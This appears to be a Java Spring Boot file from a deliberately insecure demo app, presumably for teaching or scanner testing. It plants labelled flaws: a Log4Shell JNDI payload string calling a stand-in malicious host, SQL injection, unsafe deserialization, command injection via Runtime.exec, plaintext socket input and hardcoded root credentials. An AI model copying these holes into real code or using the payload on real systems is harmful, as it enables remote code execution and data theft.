package com.rz.mostInsecureApp;

import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import java.io.IOException;
import java.io.InputStream;
import java.net.ServerSocket;
import java.net.Socket;
import java.nio.charset.StandardCharsets;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.Statement;

@SpringBootApplication
public class MostInsecureAppApplication {

	private static final Logger logger = LogManager.getLogger(MostInsecureAppApplication.class);

    public static void main(String[] args) {
        try {
            // Vulnerability 1: Log4Shell (CVE-2021-44228)
            simulateLog4Shell();

            // Vulnerability 2: SQL Injection
            simulateSQLInjection("userInput");

            // Vulnerability 3: Deserialization of Untrusted Data
            simulateDeserialization();

            // Vulnerability 4: Command Injection
            simulateCommandInjection("userInput");

            // Vulnerability 5: Insecure Socket Communication
            simulateInsecureSocketCommunication();
            
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    // Simulates a vulnerability like Log4Shell by logging unsanitized user input
    private static void simulateLog4Shell() {
        String userInput = "${jndi:ldap://malicious-server.com/exploit}";
        logger.info("User input: " + userInput);
    }

    // Simulates SQL Injection by concatenating user input directly into a SQL query
    private static void simulateSQLInjection(String userInput) {
        try (Connection connection = DriverManager.getConnection("jdbc:mysql://localhost:3306/test", "root", "password")) {
            Statement statement = connection.createStatement();
            // Vulnerable to SQL injection
            String query = "SELECT * FROM users WHERE username = '" + userInput + "'";
            ResultSet resultSet = statement.executeQuery(query);
            while (resultSet.next()) {
                System.out.println("User found: " + resultSet.getString("username"));
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    // Simulates Deserialization of Untrusted Data
    private static void simulateDeserialization() {
        try {
            // Assume we receive this from an untrusted source
            byte[] serializedData = receiveDataFromUntrustedSource();
            // Vulnerable deserialization
            Object obj = new java.io.ObjectInputStream(new java.io.ByteArrayInputStream(serializedData)).readObject();
            System.out.println("Deserialized object: " + obj);
        } catch (IOException | ClassNotFoundException e) {
            e.printStackTrace();
        }
    }

    // Simulates Command Injection by using unsanitized user input in a command
    private static void simulateCommandInjection(String userInput) {
        try {
            // Vulnerable command injection
            Process process = Runtime.getRuntime().exec("ls " + userInput);
            try (InputStream is = process.getInputStream()) {
                byte[] buffer = new byte[is.available()];
                is.read(buffer);
                System.out.println(new String(buffer, StandardCharsets.UTF_8));
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    // Simulates Insecure Socket Communication
    private static void simulateInsecureSocketCommunication() {
        try (ServerSocket serverSocket = new ServerSocket(12345)) {
            Socket clientSocket = serverSocket.accept();
            InputStream inputStream = clientSocket.getInputStream();
            byte[] buffer = new byte[1024];
            int bytesRead = inputStream.read(buffer);
            // Insecure transmission of sensitive data
            String receivedData = new String(buffer, 0, bytesRead, StandardCharsets.UTF_8);
            System.out.println("Received data: " + receivedData);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    // Placeholder method to simulate receiving serialized data from an untrusted source
    private static byte[] receiveDataFromUntrustedSource() {
        // Return a dummy byte array; replace with actual input for real testing
        return new byte[]{0, 1, 2, 3, 4, 5};
    }
    
}
